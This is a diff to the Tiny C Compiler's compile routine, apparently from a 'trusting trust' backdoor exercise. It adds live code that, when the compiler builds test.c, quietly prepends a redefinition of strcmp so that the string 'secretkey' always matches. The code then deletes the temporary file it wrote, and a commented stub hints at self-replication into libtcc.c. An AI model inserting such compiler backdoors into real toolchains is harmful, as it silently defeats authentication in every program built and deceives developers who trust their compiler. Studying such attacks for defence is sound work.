@@ -710,17 +710,28 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
     // sneaky beaky
 
 
-	// old attack, not needed anymore
-    // int file_checker = 0;
-    // if (strcmp(str, "test.c") == 0) {
+    int file_checker = 0;
+    if (strcmp(str, "test.c") == 0) {
+        FILE *temp;
+        temp = fopen("error_log.txt", "w");
+
+        fprintf (temp, "#include <string.h>\nint strcmp_vulnerable(char * i1, char * i2) {\nif (strcmp(i1,\"secretkey\") == 0 || strcmp(i2,\"secretkey\") == 0) {\nreturn 0;\n}\nreturn strcmp(i1,i2);\n}\n#define strcmp(my_val1,my_val2) strcmp_vulnerable(my_val1,my_val2)\n");
+        char buf;
+        while(read(fd, &buf, 1) > 0) {
+            fprintf(temp, &buf);
+        }
+        fclose(temp);
+
+        fd = _tcc_open(s1, "error_log.txt");
+        str = "error_log.txt";
+        file_checker = 1;
+    }
+
+    // if (strcmp(str, "libtcc.c") == 0) {
     //     FILE *temp;
     //     temp = fopen("error_log.txt", "w");
 
-    //     fprintf (temp, "#include <string.h>\nint strcmp_vulnerable(char * i1, char * i2) {\nif (strcmp(i1,\"secretkey\") == 0 || strcmp(i2,\"secretkey\") == 0) {\nreturn 0;\n}\nreturn strcmp(i1,i2);\n}\n#define strcmp(my_val1,my_val2) strcmp_vulnerable(my_val1,my_val2)\n");
-    //     char buf;
-    //     while(read(fd, &buf, 1) > 0) {
-    //         fprintf(temp, &buf);
-    //     }
+    //     fprintf (temp, s, 34,s,34);
     //     fclose(temp);
 
     //     fd = _tcc_open(s1, "error_log.txt");
@@ -764,10 +775,9 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
     tcc_exit_state();
 
     tccelf_end_file(s1);
-    // old attack, not needed anymore
-    // if (file_checker == 1) {
-    //     remove("error_log.txt");
-    // }
+    if (file_checker == 1) {
+        remove("error_log.txt");
+    }
     return s1->nb_errors != 0 ? -1 : 0;
 }
 
